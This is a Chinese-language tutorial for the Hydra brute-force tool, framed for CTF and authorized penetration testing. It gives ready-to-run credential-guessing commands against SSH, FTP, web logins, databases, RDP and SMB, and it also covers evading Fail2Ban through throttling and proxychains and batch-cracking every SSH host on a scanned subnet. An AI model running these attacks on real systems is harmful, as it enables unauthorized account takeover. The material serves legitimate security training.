# Hydra 使用手册（网络服务暴力破解）

> 免责声明：请仅在你有权限的系统上使用密码破解工具。未经授权的暴力破解行为是违法的。本手册仅用于教育和合法的安全测试。

---

## 目录
1. 概述
2. 安装方法
3. 基本命令结构
4. 支持的协议和服务
5. 常用命令与示例
6. 字典攻击技巧
7. CTF 常见场景
8. 实战案例
9. 性能优化与调优
10. 常见问题与排查
11. 高级技巧与组合使用
12. 参考链接

---

## 1. 概述

Hydra（又名 THC-Hydra）是目前最流行的网络服务暴力破解工具之一，支持50+种协议，包括 SSH、FTP、HTTP、MySQL、RDP、SMB 等。它的优势在于：
- 支持多线程并行攻击（速度快）
- 支持多种协议（覆盖面广）
- 可配合字典和规则（灵活性高）
- 跨平台支持（Linux/macOS/Windows）

**适用场景**：
- CTF 比赛中的弱密码破解
- 渗透测试中的账户枚举
- 安全审计中的密码强度检查
- Web 表单登录破解

**版本信息**：本手册基于 Hydra v9.6+

---

## 2. 安装方法

### macOS 安装
```bash
# 使用 Homebrew 安装
brew install hydra

# 验证安装
hydra -h
```

### Kali Linux / Debian / Ubuntu
```bash
# Kali 自带，如需更新
sudo apt update
sudo apt install hydra

# 或安装完整版（含 GUI）
sudo apt install hydra-gtk
```

### 从源码编译
```bash
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install
```

---

## 3. 基本命令结构

```bash
hydra [选项] [目标主机] [协议] [服务/端口] [账户/密码选项]

# 标准格式
hydra -l <用户名> -p <密码> [协议]://[目标IP]:[端口]

# 字典攻击
hydra -L <用户名字典> -P <密码字典> [协议]://[目标IP]
```

### 核心选项说明

**目标指定**：
- `-l <username>` - 指定单个用户名
- `-L <userlist>` - 从文件读取用户名列表
- `-p <password>` - 指定单个密码
- `-P <passlist>` - 从文件读取密码列表
- `-C <file>` - 使用 "用户名:密码" 格式的组合文件

**攻击配置**：
- `-t <tasks>` - 并行任务数（默认16，建议根据目标调整）
- `-w <seconds>` - 响应等待时间（默认32秒）
- `-f` - 发现第一个有效凭据后立即停止
- `-F` - 发现有效凭据后停止所有任务
- `-s <port>` - 指定非标准端口
- `-o <file>` - 输出结果到文件

**协议选项**：
- `-m <module_options>` - 协议特定参数（如 HTTP 路径）
- `-V` - 显示详细输出（每次尝试）
- `-d` - 调试模式
- `-q` - 安静模式（仅显示结果）

---

## 4. 支持的协议和服务

### 最常用协议（CTF & 渗透测试）

| 协议 | 说明 | 默认端口 |
|------|------|---------|
| ssh | SSH 登录 | 22 |
| ftp | FTP 登录 | 21 |
| http-get | HTTP GET 基本认证 | 80/443 |
| http-post-form | HTTP POST 表单登录 | 80/443 |
| mysql | MySQL 数据库 | 3306 |
| smb | Windows SMB | 445 |
| rdp | 远程桌面 | 3389 |
| telnet | Telnet 登录 | 23 |
| pop3 | POP3 邮件 | 110 |
| imap | IMAP 邮件 | 143 |

### 其他支持协议
```
adam6500, asterisk, cisco, cisco-enable, cvs, firebird, ftps,
http-head, http-proxy, https-form-get, https-form-post,
https-get, https-head, https-post, http-proxy-urlenum,
icq, irc, ldap, memcached, mongodb, mssql, mysql, nntp,
oracle-listener, oracle-sid, pcanywhere, pcnfs, pop3s,
postgres, redis, rexec, rlogin, rpcap, rsh, rtsp, s7-300,
sip, smb, smtp, smtps, snmp, socks5, ssh, sshkey, svn,
teamspeak, telnet, telnets, vmauthd, vnc, xmpp
```

---

## 5. 常用命令与示例

### 5.1 SSH 暴力破解

**单用户单密码测试**：
```bash
hydra -l admin -p password123 ssh://192.168.1.100
```

**单用户字典攻击**：
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
```

**用户名和密码双字典**：
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4
```

**指定非标准端口**：
```bash
hydra -l admin -P pass.txt ssh://192.168.1.100:2222
```

### 5.2 FTP 暴力破解

**匿名登录测试**：
```bash
hydra -l anonymous -p anonymous ftp://192.168.1.100
```

**字典攻击**：
```bash
hydra -L users.txt -P passwords.txt ftp://192.168.1.100 -t 16
```

### 5.3 Web 表单登录破解（最常见）

**HTTP POST 表单登录**：
```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
```

**参数说明**：
- `/login.php` - 登录表单的 URL 路径
- `username=^USER^&password=^PASS^` - POST 参数格式（^USER^ 和 ^PASS^ 是占位符）
- `Invalid username or password` - 登录失败时的关键字（用于判断失败）

**使用成功标识（推荐）**：
```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:S=Welcome"
```
- `S=Welcome` - 登录成功时页面包含 "Welcome" 字样（更准确）

**带 Cookie/Session 的登录**：
```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=abc123:F=Invalid"
```

**HTTPS 登录**：
```bash
hydra -l admin -P passwords.txt 192.168.1.100 https-post-form \
  "/admin/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

### 5.4 HTTP 基本认证

```bash
# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin/

# 指定路径和端口
hydra -l admin -P passwords.txt http-get://192.168.1.100:8080/secret/
```

### 5.5 MySQL 数据库

```bash
# 默认端口 3306
hydra -l root -P passwords.txt mysql://192.168.1.100

# 指定数据库名
hydra -l root -P passwords.txt mysql://192.168.1.100/testdb
```

### 5.6 RDP 远程桌面

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.100
```

### 5.7 SMB/Windows 共享

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.100
```

---

## 6. 字典攻击技巧

### 6.1 常用字典路径（Kali Linux）

```bash
# RockyYou（最常用，1400万+密码）
/usr/share/wordlists/rockyou.txt

# SecLists（分类详细）
/usr/share/seclists/Passwords/
/usr/share/seclists/Usernames/

# 常见用户名
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# 弱密码 Top 1000
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
```

### 6.2 自定义字典生成

**使用 CeWL 从网站生成字典**：
```bash
cewl -d 2 -m 5 -w custom.txt http://target.com
```

**使用 Crunch 生成组合**：
```bash
# 生成6位数字密码
crunch 6 6 0123456789 -o numbers.txt

# 生成常见模式（如：admin + 年份）
crunch 9 9 -t admin%%%% -o admin_years.txt
```

**合并多个字典**：
```bash
cat dict1.txt dict2.txt | sort -u > combined.txt
```

### 6.3 用户名枚举技巧

**常见默认用户名列表**：
```
admin
administrator
root
user
test
guest
demo
webmaster
```

**组织相关用户名**：
- 员工姓名（拼音/英文）
- 常见昵称
- 组织名缩写

---

## 7. CTF 常见场景

### 场景1：SSH 弱密码登录

**题目特征**：提供 SSH 服务，提示弱密码

**解题步骤**：
```bash
# 1. 扫描确认 SSH 服务
nmap -p 22 target.com

# 2. 尝试常见用户名
hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  ssh://target.com -t 4 -V

# 3. 如果有用户名提示，直接破解密码
hydra -l ctfuser -P rockyou.txt ssh://target.com -f
```

### 场景2：Web 后台登录

**题目特征**：管理后台，需要账户密码

**解题步骤**：
```bash
# 1. 查看登录表单参数（Chrome DevTools - Network）
# 例如：POST /admin/login.php
#       username=admin&password=123456

# 2. 抓取失败响应特征
#    失败："用户名或密码错误"
#    成功：跳转到 dashboard

# 3. 使用 Hydra 破解
hydra -l admin -P passwords.txt target.com http-post-form \
  "/admin/login.php:username=^USER^&password=^PASS^:用户名或密码错误" -V

# 4. 如果有验证码，通常 CTF 中验证码可能失效或可绕过
```

### 场景3：FTP 匿名访问失败

**题目特征**：提供 FTP 服务，但匿名登录失败

```bash
# 1. 尝试默认账户
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  ftp://target.com

# 2. 字典攻击
hydra -l admin -P passwords.txt ftp://target.com -t 8
```

### 场景4：HTTP Basic Auth

**题目特征**：访问页面弹出认证框

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-get://target.com/secret/ -f -V
```

---

## 8. 实战案例

### 案例1：破解 DVWA 登录（Damn Vulnerable Web Application）

**目标**：DVWA 默认登录页面

```bash
# 1. 启动 DVWA（通常在本地 http://localhost/dvwa）

# 2. 查看登录表单
#    URL: /dvwa/login.php
#    POST 参数: username=^USER^&password=^PASS^&Login=Login
#    失败标识: "Login failed"

# 3. 执行 Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 \
  http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
  -t 10 -w 30 -V
```

**结果**：找到密码 `password`

### 案例2：破解 SSH 弱密码服务器

**目标**：192.168.1.50（已知用户名 ctfadmin）

```bash
# 1. 使用 Top 10000 常用密码
hydra -l ctfadmin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  ssh://192.168.1.50 -t 4 -f

# 2. 如果失败，使用 RockyYou 完整字典（较慢）
hydra -l ctfadmin -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.1.50 -t 4 -f -V

# 3. 成功后保存结果
hydra -l ctfadmin -P passwords.txt ssh://192.168.1.50 -o ssh_result.txt
```

### 案例3：MySQL 数据库弱密码

**目标**：target.com:3306

```bash
# 1. 使用 MySQL 常见密码
hydra -l root -P /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt \
  mysql://target.com

# 2. 扩展字典攻击
hydra -l root -P rockyou.txt mysql://target.com -t 4 -f
```

### 案例4：破解 WordPress 登录

**目标**：http://target.com/wp-login.php

```bash
# 1. 查看 WordPress 登录 POST 参数
#    log=^USER^&pwd=^PASS^&wp-submit=Log+In

# 2. 执行 Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Dashboard" \
  -t 10 -V

# 或使用失败标识
hydra -l admin -P passwords.txt target.com \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" \
  -t 10 -V
```

---

## 9. 性能优化与调优

### 9.1 并行任务数调整

**默认值**：`-t 16`

**建议值**：
- SSH/FTP：`-t 4`（避免触发防护）
- HTTP/Web：`-t 10-20`（取决于服务器性能）
- MySQL/数据库：`-t 4-8`
- 本地测试：`-t 64`（最大速度）

```bash
# 低速模式（隐蔽）
hydra -l admin -P passwords.txt ssh://target -t 1 -w 5

# 高速模式（本地）
hydra -l admin -P passwords.txt http-post-form "..." -t 64
```

### 9.2 避免被防护系统检测

**Fail2Ban / 防火墙规避**：
```bash
# 1. 降低并发数
-t 2

# 2. 增加等待时间
-w 10

# 3. 使用代理链（需配置 proxychains）
proxychains hydra -l admin -P passwords.txt ssh://target -t 1
```

### 9.3 断点续传

```bash
# 1. 长时间攻击时使用恢复文件
hydra -l admin -P huge_dict.txt ssh://target -o progress.txt -R

# 2. 如果中断，恢复攻击
hydra -R
```

---

## 10. 常见问题与排查

### 问题1：所有尝试都失败

**原因分析**：
1. 失败标识（F=）设置错误
2. POST 参数格式错误
3. 服务器有 CSRF Token 或验证码
4. 字典中没有正确密码

**排查方法**：
```bash
# 1. 启用详细输出检查每次尝试
hydra -l admin -p test123 target http-post-form "..." -V

# 2. 手动验证登录逻辑
curl -X POST http://target/login.php -d "username=admin&password=test"

# 3. 确认失败/成功标识
#    - F= 表示失败页面包含的字符串
#    - S= 表示成功页面包含的字符串（更可靠）
```

### 问题2：HTTP POST 表单破解无效

**常见原因**：
- CSRF Token 保护
- Session Cookie 缺失
- 参数名称错误

**解决方案**：
```bash
# 1. 添加 Cookie（通过浏览器获取）
hydra ... http-post-form "...:H=Cookie: sessionid=abc123:..."

# 2. 检查 POST 参数名称（Chrome DevTools）
#    确保 ^USER^ 和 ^PASS^ 对应正确的参数名

# 3. 如果有 CSRF Token，通常需要编写自定义脚本
```

### 问题3：SSH 连接被拒绝

**错误信息**：`[ERROR] Connection refused`

**原因**：
1. 端口错误
2. 防火墙阻止
3. SSH 服务未启动

**解决方案**：
```bash
# 1. 确认端口开放
nmap -p 22 target

# 2. 测试手动连接
ssh admin@target

# 3. 指定正确端口
hydra -l admin -P passwords.txt ssh://target:2222
```

### 问题4：速度太慢

**优化方法**：
```bash
# 1. 增加并行任务
-t 32

# 2. 减少等待时间
-w 10

# 3. 使用更小的字典
head -n 10000 rockyou.txt > top10k.txt

# 4. 优先尝试常见密码
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
```

---

## 11. 高级技巧与组合使用

### 11.1 与 Nmap 结合

**扫描 + 破解流程**：
```bash
# 1. 扫描网段找出 SSH 服务
nmap -p 22 --open 192.168.1.0/24 -oG ssh_hosts.txt

# 2. 提取 IP 地址
cat ssh_hosts.txt | grep "22/open" | awk '{print $2}' > targets.txt

# 3. 批量破解
while read ip; do
  hydra -l root -P passwords.txt ssh://$ip -t 4 -o results.txt
done < targets.txt
```

### 11.2 与 Medusa 对比

**Hydra vs Medusa**：
- Hydra：协议多、速度快、社区活跃
- Medusa：稳定性好、支持模块化

**同时使用**：
```bash
# 先用 Hydra 快速扫描
hydra -l admin -P top1000.txt ssh://target -t 16

# 如果失败，用 Medusa 慢速但稳定地尝试
medusa -h target -u admin -P rockyou.txt -M ssh -t 4
```

### 11.3 生成自定义规则字典

**使用 Hashcat 规则生成变体**：
```bash
# 1. 基础字典
echo "password" > base.txt

# 2. 应用规则生成变体
hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule > variants.txt

# 3. 使用变体字典
hydra -l admin -P variants.txt ssh://target
```

### 11.4 结合用户名枚举

**SMTP 用户名枚举 + 密码破解**：
```bash
# 1. 枚举有效用户名（使用 VRFY 命令）
smtp-user-enum -M VRFY -U users.txt -t target.com > valid_users.txt

# 2. 使用有效用户名进行密码破解
hydra -L valid_users.txt -P passwords.txt ssh://target.com
```

---

## 12. 参考链接

### 官方资源
- **Hydra GitHub**：https://github.com/vanhauser-thc/thc-hydra
- **官方文档**：https://github.com/vanhauser-thc/thc-hydra/blob/master/README
- **支持的服务列表**：https://github.com/vanhauser-thc/thc-hydra#supported-services

### 字典资源
- **SecLists**：https://github.com/danielmiessler/SecLists
- **RockyYou 下载**：https://github.com/brannondorsey/naive-hashcat/releases
- **CrackStation 字典**：https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

### 教程和案例
- **Kali Hydra 教程**：https://www.kali.org/tools/hydra/
- **OWASP Testing Guide**：https://owasp.org/www-project-web-security-testing-guide/
- **CTF WriteUps**：https://ctftime.org/writeups

### 相关工具
- **Medusa**：http://foofus.net/goons/jmk/medusa/medusa.html
- **Ncrack**：https://nmap.org/ncrack/
- **Patator**：https://github.com/lanjelot/patator
- **CeWL**（字典生成）：https://github.com/digininja/CeWL

---

## 安全与法律提示

⚠️ **重要提醒**：
1. **仅在授权环境使用**：未经授权的密码破解是违法行为
2. **CTF 和靶场环境**：推荐使用 HackTheBox、TryHackMe、DVWA 等合法平台
3. **企业使用需书面授权**：渗透测试前必须获得客户书面许可
4. **遵守速率限制**：避免 DDoS 攻击，合理设置 `-t` 和 `-w` 参数
5. **保护隐私**：不要将破解结果用于非法目的

**合法使用场景**：
- ✅ CTF 竞赛和训练平台
- ✅ 个人搭建的测试环境
- ✅ 有书面授权的渗透测试
- ✅ 安全研究和漏洞挖掘（负责任披露）

---

**文档版本**：v1.0
**更新日期**：2025-01
**适用版本**：Hydra v9.0 - v9.6+
